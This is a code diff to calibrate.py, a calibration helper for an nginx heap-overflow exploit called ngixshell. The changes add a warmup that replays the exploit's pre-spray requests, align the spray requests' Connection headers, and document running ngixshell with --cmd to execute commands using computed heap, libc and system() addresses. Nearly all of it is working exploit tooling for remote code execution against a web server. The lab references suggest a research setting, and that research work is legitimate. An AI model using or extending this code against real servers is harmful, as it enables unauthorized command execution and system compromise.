@@ -11,14 +11,18 @@ Requirements
 
 Usage
 -----
-  sudo python3 calibrate.py <host> <port> <worker_pid> --json -o profile.json
+  sudo python3 calibrate.py <host> <port> <worker_pid> --spray-path /spray \
+      --spray-mode full --json -o profile.json
+  # restart nginx so the worker starts from the same clean heap state, then:
+  python3 ngixshell.py <host> --cmd 'id > /tmp/rce.txt' --build-file profile.json
+
+The script replicates the requests ngixshell makes before spraying (TLS probe,
+fingerprint, wait_alive) so the offsets line up at exploitation time.
 
 Output
 ------
 Writes a calibration profile (HEAP_BASE, LIBC_BASE, system(), URL-safe spray
-offsets) consumed by ngixshell.py:
-
-  python3 ngixshell.py <host> --cmd 'id' --build-file profile.json
+offsets, spray mode/path/count) consumed by ngixshell.py via --build-file.
 
 Example
 -------
@@ -50,6 +54,58 @@ def read_heap_ranges(pid: int):
 # Unique marker placed at the start of the spray body: the body buffer address
 # is what the overflow must target, so we locate exactly that allocation.
 MARKER = b"NGIXCALIBRATION-SENTINEL-"
+
+
+def exploit_warmup(host: str, port: int) -> None:
+    """Replicate what ngixshell does before the spray in --cmd mode.
+
+    The exploit performs a TLS auto-detect connect, a fingerprint GET and a
+    wait_alive GET before it starts spraying. Those requests move the heap
+    cursor, so calibration must start from the same state or the offsets will
+    not match at exploitation time. When ngixshell.py sits next to this
+    script, its real functions are used for a byte-exact warmup.
+    """
+    here = os.path.dirname(os.path.abspath(__file__))
+    if here not in sys.path:
+        sys.path.insert(0, here)
+    try:
+        import ngixshell as ngs
+    except ImportError:
+        ngs = None
+
+    if ngs is not None:
+        try:
+            ngs._auto_detect_tls(host, port)
+        except Exception:
+            pass
+        try:
+            ngs.fingerprint_target(host, port)
+        except Exception:
+            pass
+        try:
+            ngs.wait_alive(host, port, timeout=1)
+        except Exception:
+            pass
+        return
+
+    try:
+        s = socket.create_connection((host, port), timeout=4)
+        s.close()
+    except OSError:
+        pass
+    for _ in range(2):
+        try:
+            s = socket.create_connection((host, port), timeout=4)
+            s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n"
+                      f"Connection: close\r\n\r\n".encode())
+            s.settimeout(3)
+            try:
+                s.recv(1024)
+            except OSError:
+                pass
+            s.close()
+        except OSError:
+            pass
 
 
 def find_markers(pid: int, marker: bytes = MARKER) -> list:
@@ -86,17 +142,19 @@ def open_slow_post(host: str, port: int, body_len: int = 4096,
     if spray_mode == "full":
         clen   = body_len
         extra  = b"X-Delay: 60\r\n"
+        conn   = b"close"          # must match ngixshell's full-mode request
         tail   = body
     else:
         clen   = body_len * 4
         extra  = b""
+        conn   = b"keep-alive"
         tail   = body
     s.sendall(
         b"POST " + proxy_path.encode() + b" HTTP/1.1\r\n"
         b"Host: " + host.encode() + b"\r\n"
         b"Content-Length: " + str(clen).encode() + b"\r\n"
         + extra +
-        b"Connection: keep-alive\r\n"
+        b"Connection: " + conn + b"\r\n"
         b"\r\n" + tail
     )
     return s
@@ -157,6 +215,9 @@ def main():
     ap.add_argument("--spray-mode", choices=["partial", "full"], default="partial",
                     help="partial: short body + large Content-Length (bundled lab); "
                          "full: complete body + X-Delay (DepthFirst lab)")
+    ap.add_argument("--no-warmup", action="store_true",
+                    help="skip the pre-spray warmup that replicates ngixshell's "
+                         "exploit mode (TLS connect + fingerprint GET + wait_alive)")
     args = ap.parse_args()
 
     HOST = args.host
@@ -179,6 +240,11 @@ def main():
         print(f"[*] SYSTEM_ADDR: 0x{libc_base + sys_off:x}")
     else:
         print("[!] Could not locate system() — check libc path")
+
+    if not args.no_warmup:
+        print()
+        print("[*] Warmup: replicating ngixshell's pre-spray requests ...")
+        exploit_warmup(HOST, PORT)
 
     print()
     print("[*] Opening spray connections and locating each body buffer ...")
